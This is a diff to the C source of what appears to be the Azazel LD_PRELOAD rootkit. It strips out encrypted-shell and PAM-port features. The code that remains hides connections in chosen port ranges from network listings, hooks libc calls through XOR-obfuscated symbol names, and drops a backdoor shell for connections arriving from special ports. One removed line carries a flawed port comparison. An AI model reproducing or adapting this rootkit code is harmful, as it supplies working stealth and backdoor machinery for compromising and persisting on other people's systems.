@@ -20,13 +20,11 @@
 #include <utmp.h>
 #include <dirent.h>
 
-#include "crypthook.h"
 #include "xor.h"
 #include "const.h"
 #include "azazel.h"
 
-// This shows up in strings... just because
-char *azazel="The whole earth has been corrupted through the works that were taught by Azazel: to him ascribe all sin.";
+
 	
 void cleanup(void *var, int len) {
 	DEBUG("cleanup called %s\n", var);
@@ -253,10 +251,10 @@ FILE *hide_ports(const char *filename) {
 		 	&txq, &rxq, &timer_run, &time_len, &retr, &uid, &timeout, &inode, more);
 		cleanup(scanf_line,strlen(scanf_line));
 
-		if((rem_port >= LOW_PORT && rem_port <= HIGH_PORT) || (rem_port >= CRYPT_LOW && rem_port <= CRYPT_HIGH) || (rem_port == PAM_PORT)){
+		if(rem_port >= LOW_PORT && rem_port <= HIGH_PORT){
 			continue;
 		} else{				
-			if((local_port >= LOW_PORT && local_port <= HIGH_PORT) || (local_port >= CRYPT_LOW && local_port >= CRYPT_HIGH) || (local_port == PAM_PORT)){
+			if(local_port >= LOW_PORT && local_port <= HIGH_PORT){
 				continue;
 			}else{	
 				fputs(line, tmp);	
@@ -635,19 +633,16 @@ void shell_loop(int sock, int pty, int crypt) {
     ssize_t (*s_read)();
 	ssize_t (*s_write)();
 	
-	if (crypt) {
-		s_read = crypt_read;
-		s_write = crypt_write;
-	} else {
-		char *sys_write = strdup(SYS_WRITE);
-		char *sys_read = strdup(SYS_READ);
-		x(sys_write);
-		x(sys_read);
-		s_read = dlsym(RTLD_NEXT, sys_read);
-		s_write = dlsym(RTLD_NEXT, sys_write);
-		cleanup(sys_write,strlen(sys_write));
-		cleanup(sys_read,strlen(sys_read));
-	}
+
+	char *sys_write = strdup(SYS_WRITE);
+	char *sys_read = strdup(SYS_READ);
+	x(sys_write);
+	x(sys_read);
+	s_read = dlsym(RTLD_NEXT, sys_read);
+	s_write = dlsym(RTLD_NEXT, sys_write);
+	cleanup(sys_write,strlen(sys_write));
+	cleanup(sys_read,strlen(sys_read));
+
 
 	maxfd = pty;    
 	if (sock > maxfd)
@@ -764,9 +759,6 @@ int drop_shell(int sock, struct sockaddr *addr) {
 		x(sys_write);
 		s_write = dlsym(RTLD_NEXT, sys_write);
 		cleanup(sys_write, strlen(sys_write));
-	 } else if (htons(sa_i->sin_port) >= CRYPT_LOW && htons(sa_i->sin_port) <= CRYPT_HIGH) {
-		crypt_mode = CRYPT_SHELL;
-		s_write = crypt_write;
 	 } else
 		return sock;
 	
